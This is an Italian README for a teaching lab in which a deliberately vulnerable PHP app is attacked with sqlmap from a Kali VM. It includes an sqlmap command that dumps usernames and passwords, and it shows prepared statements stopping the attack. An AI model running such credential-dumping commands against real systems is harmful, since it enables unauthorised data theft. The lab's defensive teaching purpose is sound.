# **Attacco SQL Injection con SQLmap e Contromisure**

### <br>Descrizione del Progetto<br>
Questo progetto ha l’obiettivo di dimostrare il funzionamento di un attacco SQL Injection utilizzando SQLmap, un tool open-source per testare la sicurezza dei database contro questo tipo di attacco. Il progetto include un ambiente di test con un’applicazione vulnerabile a SQL Injection e documentazione su come sfruttare questa vulnerabilità per accedere a dati sensibili.

### <br>Funzionalità del Progetto
1. Setup di un’applicazione vulnerabile con supporto per test SQL Injection.
2. Utilizzo di SQLmap per eseguire l’attacco SQL Injection.
3. Guida passo-passo per esplorare la vulnerabilità, comprendere i rischi e identificare le potenziali soluzioni.

### <br>Prerequisiti
- VirtualBox: per eseguire l'applicazione vulnerabile in un ambiente isolato
- SQLmap: il tool principale per condurre il test di SQL Injection
- Familiarità con i concetti di base di SQL e database

### <br>Installazione
1. Installare VirtualBox e creare due macchine virtuali: Ubuntu (target) e Kali (attacker).
2. Modificare l'impostazione 'Rete' di entrambe le macchine, scegliendo l'opzione 'Scheda con bridge', per una corretta comunicazione tra loro.
3. Eseguire sulla macchina Ubuntu:
```
    sudo apt install apache2
    sudo apt install php
    sudo apt install mysql-server
    sudo mysql_secure_installation
    sudo apt install php-mysqli
    sudo apt install phpmyadmin
    sudo apt install ssh
```
4. Clonare il repository sulla macchina Ubuntu:
```
   git clone https://github.com/almaadt/cybersec
```
5. Copiare la cartella 'app' scaricata con il precedente comando nella directory radice delle pagine web (tipicamente /var/www/html) nella macchina Ubuntu.
6. Importare il database MySQL di esempio sulla macchina Ubuntu e modificare le password nei files php dell'applicazione.


### <br>Esecuzione dell'Attacco SQL Injection con SQLmap
1. Eseguire sulla macchina Kali il comando:
 ```
    sqlmap -u "http://indirizzo_macchina_ubuntu/app/sqlmapunsafe.php?id=1" -D demo -T utenti -C "username,password" --dump
 ```
   che restituisce (tramite il dump) i campi 'username' e 'password' di tutti gli utenti presenti nella tabella 'utenti' (che a sua volta si trova nel database 'demo').


### <br>Test delle contromisure<br>
Le vulnerabilità vengono risolte con una query preparata, presente all'interno del file 'sqlmapsafe.php', infatti, eseguendo in Kali il comando:
```
sqlmap -u "http://indirizzo_macchina_ubuntu/app/sqlmapsafe.php?id=1" -D demo -T utenti -C "username,password" --dump
```
possiamo notare che l'attacco fallisce.


### <br>Struttura del Repository
- /app: directory contenente l'applicativo.
- database-di-esempio.dmp: database MySQL di esempio.
- README.md: documentazione del progetto.


### <br>Avvertenze Legali
- Questo progetto è stato sviluppato esclusivamente a scopo didattico. Qualsiasi test di vulnerabilità deve essere eseguito solo su sistemi di cui si ha il permesso di analizzare la sicurezza. L'uso non autorizzato di SQLmap o di altri strumenti di attacco per compromettere la sicurezza di sistemi altrui è illegale e può portare a gravi conseguenze legali. L'autore declina ogni responsabilità per l'uso improprio di questo progetto.


### <br>Risorse Utili
  - sqlmap.org
  - owasp.org/www-community/attacks/SQL_Injection

